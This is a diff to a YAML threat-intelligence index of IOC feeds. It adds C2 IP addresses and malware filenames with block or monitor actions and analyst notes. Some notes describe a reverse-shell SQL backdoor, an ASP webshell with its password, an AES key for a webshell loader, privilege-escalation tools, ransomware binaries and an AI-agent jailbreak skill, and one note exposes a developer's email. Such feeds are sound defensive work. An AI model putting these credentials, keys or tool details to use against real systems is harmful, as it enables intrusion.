@@ -106,11 +106,11 @@
   feed_url: "/ioc-feeds/Hybrid-Loader-Stealer-Sogou.json"
   report_url: "/reports/Hybrid-Loader-Stealer-Sogou/"
   detection_url: "/hunting-detections/Hybrid-Loader-Stealer-Sogou-detections"
-  total: 17
+  total: 18
   untyped: 13
   counts:
     domain: 10
-    filename: 1
+    filename: 2
     ipv4: 3
     md5: 1
     sha1: 1
@@ -216,6 +216,12 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "Installer"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "s0.ndf"
       context: null
       confidence: null
@@ -317,9 +323,10 @@
   feed_url: "/ioc-feeds/agent-exe.json"
   report_url: null
   detection_url: "/hunting-detections/agent-exe-detections"
-  total: 10
+  total: 12
   untyped: 22
   counts:
+    filename: 2
     ipv4: 1
     md5: 1
     path: 3
@@ -390,6 +397,18 @@
       confidence: "CONFIRMED"
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "agent.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "windefendersvc.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "agent-xworm-exe.json":
@@ -401,9 +420,10 @@
   feed_url: "/ioc-feeds/agent-xworm-exe.json"
   report_url: null
   detection_url: "/hunting-detections/agent-xworm-exe-detections"
-  total: 4
+  total: 5
   untyped: 41
   counts:
+    filename: 1
     ipv4: 1
     md5: 1
     sha1: 1
@@ -436,6 +456,12 @@
       confidence: null
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "agent_xworm.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "agent-xworm-v2-exe.json":
@@ -447,9 +473,10 @@
   feed_url: "/ioc-feeds/agent-xworm-v2-exe.json"
   report_url: null
   detection_url: "/hunting-detections/agent-xworm-v2-exe-detections"
-  total: 4
+  total: 5
   untyped: 45
   counts:
+    filename: 1
     ipv4: 1
     md5: 1
     sha1: 1
@@ -482,6 +509,12 @@
       confidence: null
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "agent_xworm_v2.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "ai-agent-frameworks-2026-05-23":
@@ -493,12 +526,13 @@
   feed_url: "/ioc-feeds/ai-agent-frameworks-2026-05-23-iocs.json"
   report_url: "/reports/ai-agent-frameworks-2026-05-23/"
   detection_url: "/hunting-detections/ai-agent-frameworks-2026-05-23-detections"
-  total: 89
+  total: 121
   untyped: 210
   counts:
     domain: 20
     email: 1
-    ipv4: 23
+    filename: 19
+    ipv4: 36
     md5: 1
     path: 16
     sha256: 20
@@ -514,17 +548,35 @@
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "158.178.214.94"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: "Confirmed legitimate developer (elyasbetter@gmail.com owns alumni platform); NOT a threat actor"
+    - type: "ipv4"
       value: "158.178.214.94:8080"
       context: null
       confidence: "LOW"
       action: "MONITOR"
       fp_risk: "Confirmed legitimate developer (elyasbetter@gmail.com owns alumni platform); NOT a threat actor"
     - type: "ipv4"
+      value: "165.227.175.161"
+      context: "Underlying VPS host belongs to GetYourGroup GmbH legitimate tourism platform - notify victim before blocking"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: "Underlying VPS host belongs to GetYourGroup GmbH legitimate tourism platform - notify victim before blocking"
+    - type: "ipv4"
       value: "165.227.175.161:23"
       context: "Underlying VPS host belongs to GetYourGroup GmbH legitimate tourism platform - notify victim before blocking"
       confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: "Underlying VPS host belongs to GetYourGroup GmbH legitimate tourism platform - notify victim before blocking"
+    - type: "ipv4"
+      value: "173.249.2.23"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: "Confirmed false positive per Phase 11 review (979 source files, 226 grep hits all FP); NOT a threat actor - notify Anthropic on exposed credentials only"
     - type: "ipv4"
       value: "173.249.2.23:8888"
       context: null
@@ -538,13 +590,31 @@
       action: "MONITOR"
       fp_risk: null
     - type: "ipv4"
+      value: "209.38.205.158"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "209.38.205.158:8096"
       context: null
       confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "213.165.51.115"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "213.165.51.115:8082"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "221.150.15.104"
       context: null
       confidence: "DEFINITE"
       action: "BLOCK"
@@ -574,6 +644,12 @@
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "47.110.83.41"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: "Confirmed legitimate Chinese AI developer; port 666 is symbolic choice, not malicious; NOT a threat actor"
+    - type: "ipv4"
       value: "47.110.83.41:666"
       context: null
       confidence: "LOW"
@@ -585,6 +661,12 @@
       confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: null
+    - type: "ipv4"
+      value: "66.94.120.32"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: "Confirmed false positive per Phase 11 review (213 triage reports, 0 real offensive hits); NOT a threat actor - notify HF + Anthropic + OpenAI + Google T&S on exposed credentials only"
     - type: "ipv4"
       value: "66.94.120.32:8080"
       context: null
@@ -610,7 +692,19 @@
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "80.211.111.10"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "80.211.111.10:80"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "80.211.94.16"
       context: null
       confidence: "DEFINITE"
       action: "BLOCK"
@@ -622,9 +716,21 @@
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "85.17.70.56"
+      context: "Russian operator's ai_sniper_brute.py Dutch datacenter proxy"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "85.17.70.56:13400"
       context: "Russian operator's ai_sniper_brute.py Dutch datacenter proxy"
       confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "87.106.143.220"
+      context: "Rovodev/Pandora Mirai botnet C2 (Matrix C2 + standalone Mirai-clone); 1&1 IONOS Germany"
+      confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
@@ -636,6 +742,12 @@
     - type: "ipv4"
       value: "87.106.54.213"
       context: "Rovodev/Pandora backup VPS"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "95.211.175.167"
+      context: "Russian operator's ai_sniper_brute.py Dutch datacenter proxy"
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -1041,6 +1153,120 @@
       confidence: "HIGH"
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "SOUL.md"
+      context: "Default Hermes/OpenClaw persona template"
+      confidence: "MODERATE"
+      action: "MONITOR"
+      fp_risk: "Legitimate Hermes/OpenClaw installations carry this file by default; only malicious when combined with offensive tooling"
+    - type: "filename"
+      value: "bot.sh"
+      context: "Rovodev/Pandora Mirai bot deployment script"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "bundled_manifest"
+      context: "Hermes 87-skill bundled manifest"
+      confidence: "MODERATE"
+      action: "MONITOR"
+      fp_risk: "Default Hermes bundle; only malicious when combined with offensive tooling"
+    - type: "filename"
+      value: "dbus-session-monitor"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "encrypt_implant.py"
+      context: "Sliver-derivative primary implant encryptor; freshly generated Fernet key per run"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "gnome-shell-ext-updater"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "godmode/SKILL.md"
+      context: "Hermes ecosystem godmode jailbreak skill"
+      confidence: "MODERATE"
+      action: "MONITOR"
+      fp_risk: "Legitimate NousResearch Hermes installations may carry this file"
+    - type: "filename"
+      value: "keylogger.ps1"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "kriminal_crypter.py"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "launcher_combined.ps1"
+      context: "Sliver-derivative Start-Job orchestrator for screencap + keylogger"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "libpam_cache.c"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "libpam_cache.so"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "loader_v29.ps1"
+      context: "Sliver loader iteration v29; 6671 bytes, 164 lines"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "naku.arm"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "ncrypt_load.ps1"
+      context: "Sliver-derivative obfuscated single-line loader; 13328 bytes"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "pandora.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "screencap_v11.ps1"
+      context: "Sliver-derivative screencap client; streams to operator backend on TCP/9093"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "stealth.ps1"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "test_decrypt.py"
+      context: null
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
   never_block_total: 3
   never_block_rows:
     - type: "ipv4"
@@ -1061,9 +1287,10 @@
   feed_url: "/ioc-feeds/arsenal-237-BdApiUtil64-sys.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-BdApiUtil64-sys-detections"
-  total: 28
+  total: 29
   untyped: 37
   counts:
+    filename: 1
     ipv4: 1
     md5: 1
     path: 20
@@ -1238,6 +1465,12 @@
       fp_risk: null
     - type: "registry"
       value: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Bprotect"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "bdapiutil64.sys"
       context: null
       confidence: null
       action: null
@@ -1442,7 +1675,7 @@
       fp_risk: null
     - type: "filename"
       value: "dec_fixed.exe"
-      context: "Recursively processes A-Z subdirectories for encrypted file decryption"
+      context: null
       confidence: "CONFIRMED"
       action: null
       fp_risk: null
@@ -1682,10 +1915,10 @@
   feed_url: "/ioc-feeds/arsenal-237-killer-crowdstrike-dll.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-killer-crowdstrike-dll-detections"
-  total: 11
+  total: 12
   untyped: 17
   counts:
-    filename: 4
+    filename: 5
     ipv4: 1
     md5: 1
     path: 2
@@ -1739,13 +1972,7 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "BdApiUtil64.sys"
-      context: null
-      confidence: null
-      action: null
-      fp_risk: null
-    - type: "filename"
-      value: "ProcExpDriver.sys"
+      value: "bdapiutil64.sys"
       context: null
       confidence: null
       action: null
@@ -1757,7 +1984,19 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "killer_crowdstrike.dll"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "lpe.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "procexpdriver.sys"
       context: null
       confidence: null
       action: null
@@ -1773,10 +2012,10 @@
   feed_url: "/ioc-feeds/arsenal-237-killer-dll.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-killer-dll-detections"
-  total: 10
+  total: 11
   untyped: 25
   counts:
-    filename: 3
+    filename: 4
     ipv4: 1
     md5: 1
     path: 2
@@ -1830,20 +2069,26 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "BdApiUtil64.sys"
+      value: "bdapiutil64.sys"
       context: "Legitimately-signed Baidu Antivirus driver embedded in killer.dll"
       confidence: null
       action: null
       fp_risk: null
     - type: "filename"
-      value: "ProcExpDriver.sys"
-      context: "Legitimately-signed Sysinternals Process Explorer driver embedded in killer.dll"
+      value: "killer.dll"
+      context: null
       confidence: null
       action: null
       fp_risk: null
     - type: "filename"
       value: "lpe.exe"
       context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "procexpdriver.sys"
+      context: "Legitimately-signed Sysinternals Process Explorer driver embedded in killer.dll"
       confidence: null
       action: null
       fp_risk: null
@@ -1858,9 +2103,10 @@
   feed_url: "/ioc-feeds/arsenal-237-lpe-exe.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-lpe-exe-detections"
-  total: 7
+  total: 8
   untyped: 25
   counts:
+    filename: 1
     ipv4: 1
     md5: 1
     path: 1
@@ -1913,6 +2159,12 @@
       confidence: null
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "lpe.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "arsenal-237-nethost-dll.json":
@@ -1924,10 +2176,10 @@
   feed_url: "/ioc-feeds/arsenal-237-nethost-dll.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-nethost-dll-detections"
-  total: 11
+  total: 12
   untyped: 101
   counts:
-    filename: 1
+    filename: 2
     md5: 1
     path: 5
     registry: 2
@@ -1999,6 +2251,12 @@
       fp_risk: null
     - type: "filename"
       value: "arsenal-237-nethost-dll.yar"
+      context: null
+      confidence: "CONFIRMED"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nethost.dll"
       context: null
       confidence: "CONFIRMED"
       action: null
@@ -2091,10 +2349,10 @@
   feed_url: "/ioc-feeds/arsenal-237-rootkit-dll.json"
   report_url: null
   detection_url: "/hunting-detections/arsenal-237-rootkit-dll-detections"
-  total: 17
+  total: 19
   untyped: 19
   counts:
-    filename: 2
+    filename: 4
     md5: 2
     path: 3
     registry: 5
@@ -2195,6 +2453,12 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "bdapiutil64.sys"
+      context: "Legitimately-signed Baidu driver embedded for BYOVD attacks"
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "cb.exe"
       context: "Terminates 20+ security products and analysis tools"
       confidence: null
@@ -2203,6 +2467,12 @@
     - type: "filename"
       value: "repmgr.exe"
       context: "Terminates 20+ security products and analysis tools"
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rootkit.dll"
+      context: null
       confidence: null
       action: null
       fp_risk: null
@@ -2217,12 +2487,13 @@
   feed_url: "/ioc-feeds/bellamain-turkish-phaas-79-137-192-3-20260516-iocs.json"
   report_url: "/reports/bellamain-turkish-phaas-79-137-192-3-20260516/"
   detection_url: "/hunting-detections/bellamain-turkish-phaas-79-137-192-3-20260516-detections"
-  total: 28
+  total: 37
   untyped: 52
   counts:
     domain: 2
     email: 1
-    ipv4: 2
+    filename: 8
+    ipv4: 3
     md5: 1
     sha1: 1
     sha256: 8
@@ -2231,6 +2502,12 @@
   has_action: true
   has_fp_risk: true
   rows:
+    - type: "ipv4"
+      value: "79.137.192.3"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
     - type: "ipv4"
       value: "79.137.192.3:443"
       context: null
@@ -2399,6 +2676,54 @@
       confidence: "HIGH"
       action: "MONITOR"
       fp_risk: null
+    - type: "filename"
+      value: "BellaMain.zip"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dolap.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "kargo.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "letgo.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "pttavm.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "sahibinden.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "shopier.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "turkcell.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "cloudsync-assembler-toolkit-91-197-98-188":
@@ -2410,12 +2735,12 @@
   feed_url: "/ioc-feeds/cloudsync-assembler-toolkit-91-197-98-188-iocs.json"
   report_url: "/reports/cloudsync-assembler-toolkit-91-197-98-188/"
   detection_url: "/hunting-detections/cloudsync-assembler-toolkit-91-197-98-188-detections"
-  total: 50
+  total: 64
   untyped: 29
   counts:
     domain: 1
-    filename: 2
-    ipv4: 5
+    filename: 13
+    ipv4: 8
     md5: 6
     path: 15
     pattern: 3
@@ -2428,8 +2753,20 @@
   has_fp_risk: false
   rows:
     - type: "ipv4"
+      value: "2.27.248.138"
+      context: "Raw-IP TCP, no domain. :8443 = Express/socket.io operator panel (cert CN=localhost); :1337 = operator RDP (cert CN=DESKTOP-KHCG4S8)"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "2.27.248.138:4443"
       context: "Raw-IP TCP, no domain. :8443 = Express/socket.io operator panel (cert CN=localhost); :1337 = operator RDP (cert CN=DESKTOP-KHCG4S8)"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "91.197.98.188"
+      context: "Also serves CloudSync C2 on :5555 (bk dropped implant) and :7777 (svhost4), both cleartext TCP, wait-then-speak, no banner | Cleartext TCP, [END] terminator; continuously open in passive scan history | Cleartext TCP, [C2_END] terminator; confirmed on the wire (Sysmon EID 3 + PCAP)"
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -2448,6 +2785,12 @@
     - type: "ipv4"
       value: "91.197.98.188:8000"
       context: "Also serves CloudSync C2 on :5555 (bk dropped implant) and :7777 (svhost4), both cleartext TCP, wait-then-speak, no banner"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "91.92.43.221"
+      context: "Ports 5000-5003 serve identical CloudSync-Dashboard panel; client->5000, s->5001, q->5002; 5003 live with no build in hand. Aeza OFAC-designated 2025; DEDIK-inside-designation unproven."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -2698,7 +3041,37 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "SvchostPayload"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "ab.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "bk.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "client.exe"
+      context: "CloudSync dropper (later GCC 16.1 build); drops svchost.exe implant, C2 91.92.43.221:5000"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "cls.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "crystal-monk.dll"
       context: null
       confidence: "HIGH"
       action: null
@@ -2707,6 +3080,42 @@
       value: "ct.bat"
       context: null
       confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "q.exe"
+      context: "CloudSync config-only variant of client.exe; C2 91.92.43.221:5002"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rr.exe"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "s.exe"
+      context: "CloudSync config-only variant of client.exe; C2 91.92.43.221:5001"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svhost.js"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svhost4.exe"
+      context: "CloudSync standalone implant (not a dropper); C2 91.197.98.188:7777, [C2_END] terminator"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "v.exe"
+      context: null
+      confidence: null
       action: null
       fp_risk: null
     - type: "pattern"
@@ -2765,10 +3174,11 @@
   feed_url: "/ioc-feeds/dual-rat-analysis.json"
   report_url: "/reports/dual-rat-analysis/"
   detection_url: "/hunting-detections/dual-rat-analysis-detections"
-  total: 13
+  total: 16
   untyped: 19
   counts:
-    ipv4: 1
+    filename: 2
+    ipv4: 2
     md5: 2
     path: 3
     registry: 2
@@ -2779,6 +3189,12 @@
   has_action: false
   has_fp_risk: false
   rows:
+    - type: "ipv4"
+      value: "185.208.159.182"
+      context: "Direct C2 connection to fixed infrastructure"
+      confidence: null
+      action: null
+      fp_risk: null
     - type: "ipv4"
       value: "185.208.159.182:4782"
       context: "Direct C2 connection to fixed infrastructure"
@@ -2857,6 +3273,18 @@
       confidence: null
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "client.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "server (1).exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 2
   never_block_rows:
     - type: "domain"
@@ -2874,10 +3302,10 @@
   feed_url: "/ioc-feeds/enc-dec-ransomware-family.json"
   report_url: null
   detection_url: "/hunting-detections/enc-dec-ransomware-family-detections"
-  total: 34
+  total: 44
   untyped: 63
   counts:
-    filename: 3
+    filename: 13
     ipv4: 1
     md5: 10
     sha1: 10
@@ -3073,19 +3501,79 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "README.txt"
+      value: "dec.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dec_fast.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dec_pc3.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dec_unique.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "enc.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "enc_pervictim.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "enc_v2.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ransom_note_exec.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "readme.txt"
       context: "Primary ransom note deployed by enc_v2.exe, updated_enc.exe, enc.exe"
       confidence: "CONFIRMED"
       action: null
       fp_risk: null
     - type: "filename"
-      value: "README_FOR_DECRYPT.txt"
+      value: "readme_for_decrypt.txt"
       context: "Decryption instructions ransom note"
       confidence: "CONFIRMED"
       action: null
       fp_risk: null
     - type: "filename"
-      value: "ransom_note_exec.exe"
+      value: "test_decryptor.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "test_gui_enc_v2.exe"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "updated_enc.exe"
       context: null
       confidence: null
       action: null
@@ -3101,12 +3589,12 @@
   feed_url: "/ioc-feeds/evilsoul-engine-stealer-maas-iocs.json"
   report_url: "/reports/evilsoul-engine-stealer-maas-144-172-103-98/"
   detection_url: "/hunting-detections/evilsoul-engine-stealer-maas-detections"
-  total: 74
+  total: 78
   untyped: 41
   counts:
     domain: 12
     filename: 2
-    ipv4: 6
+    ipv4: 10
     md5: 5
     path: 13
     registry: 4
@@ -3118,10 +3606,22 @@
   has_fp_risk: true
   rows:
     - type: "ipv4"
+      value: "144.172.103.98"
+      context: "Origin open directory (KAIDO Services), AS14956 RouterHosting US, DEAD as of 2026-06-27"
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "ipv4"
       value: "144.172.103.98:8888"
       context: "Origin open directory (KAIDO Services), AS14956 RouterHosting US, DEAD as of 2026-06-27"
       confidence: "DEFINITE"
       action: "MONITOR"
+      fp_risk: null
+    - type: "ipv4"
+      value: "144.172.109.203"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
       value: "144.172.109.203:4782"
@@ -3136,9 +3636,21 @@
       action: "MONITOR"
       fp_risk: null
     - type: "ipv4"
+      value: "198.1.195.207"
+      context: "EvilSoul builder default panel, AS210554 Meteor Cloud / MagnoHost BR (PART B)"
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "198.1.195.207:80"
       context: "EvilSoul builder default panel, AS210554 Meteor Cloud / MagnoHost BR (PART B)"
       confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "198.1.195.210"
+      context: null
+      confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
@@ -3572,10 +4084,10 @@
   feed_url: "/ioc-feeds/flaskc2-postex-toolkit-67-215-232-25-iocs.json"
   report_url: "/reports/flaskc2-postex-toolkit-67-215-232-25/"
   detection_url: "/hunting-detections/flaskc2-postex-toolkit-67-215-232-25-detections"
-  total: 33
+  total: 44
   untyped: 6
   counts:
-    filename: 5
+    filename: 16
     ipv4: 1
     md5: 6
     path: 1
@@ -3760,26 +4272,92 @@
       action: "HUNT"
       fp_risk: null
     - type: "filename"
+      value: "cmd_exece.dll"
+      context: "BESPOKE MSSQL SQL-CLR reverse-shell backdoor; [SqlProcedure] reverse_shell(ip,port) -> cmd.exe /c. Specific operator build (compile 2026-03-21). VT 32 malicious; Zenbox harmless 98% (sandbox-resistant), Microsoft+Kaspersky clean."
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
       value: "cve-2026-20817_poc.exe"
-      context: null
+      context: "Non-weaponized demonstration PoC for the WER ALPC LPE (CVE-2026-20817, patched Jan 2026). Scaffolds the technique but does NOT elevate (TOKEN_QUERY only; no ALPC/DuplicateTokenEx/CreateProcess*). ITW IP 67.215.232.25. 13 VT submissions (rare)."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "e.exe"
+      context: "Netcat (nc64.exe), public tool. HackTool:Win32/NetCat. 7KB overlay stripped by PreProcess."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "ep.exe"
+      context: "EfsPotato (operator-recompiled .NET, compile 2026-03-20). MS-EFSR coercion + SeImpersonate. YARA tool_efspotato + Windows_Exploit_FakePipe; Zenbox=EfsPotato/PetitPotam. Identified as public tool via signature, not hash identity."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "g.exe / gp.exe"
+      context: "GodPotato (operator-recompiled .NET). Universal DCOM/RPC SeImpersonate Potato. g.exe and gp.exe are byte-identical. Identified as public tool via signature, not hash identity."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "jp.exe"
+      context: "JuicyPotato(NG), public native tool (prebuilt, hash-match). SeImpersonate DCOM privesc."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "miss.asp"
+      context: "Commodity Ghost小组 (gb2312 Chinese) full-feature ASP webshell, VBScript.Encode. Password UserPass=Aatrox; stored eval gadget Execute Session('Aatrox'). Neo23x0 WEBSHELL_ASP_Encoded fires on the wrapper."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
     - type: "filename"
       value: "npcinfolist1.aspx"
+      context: "AES in-memory .NET assembly loader webshell (Godzilla-style). RijndaelManaged CBC/PKCS7, key=IV ca63457538b9b1e0; POST body -> Assembly.Load -> CreateInstance('K'). Class-K payload runtime-delivered, not staged."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "ntapidotnet.dll"
       context: null
+      confidence: "HIGH"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "p.exe / P64.exe"
+      context: "PrintSpoofer64, public native tool (prebuilt, hash-match). Spooler named-pipe SeImpersonate privesc. p.exe and P64.exe are byte-identical."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
     - type: "filename"
       value: "rogueoxidresolver.exe"
-      context: null
+      context: "RoguePotato OXID-resolver helper, public native tool (prebuilt, hash-match)."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
     - type: "filename"
       value: "roguepotato.exe"
-      context: null
